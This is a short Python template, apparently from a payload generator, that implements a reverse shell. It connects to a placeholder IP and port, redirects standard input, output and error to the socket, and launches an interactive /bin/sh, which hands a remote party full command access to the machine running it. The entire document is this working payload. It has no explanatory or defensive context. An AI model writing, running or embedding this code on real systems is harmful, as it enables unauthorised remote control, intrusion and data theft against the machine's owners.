import socket,subprocess,os
ip={ip}
port={port}
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((ip,port))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"]);
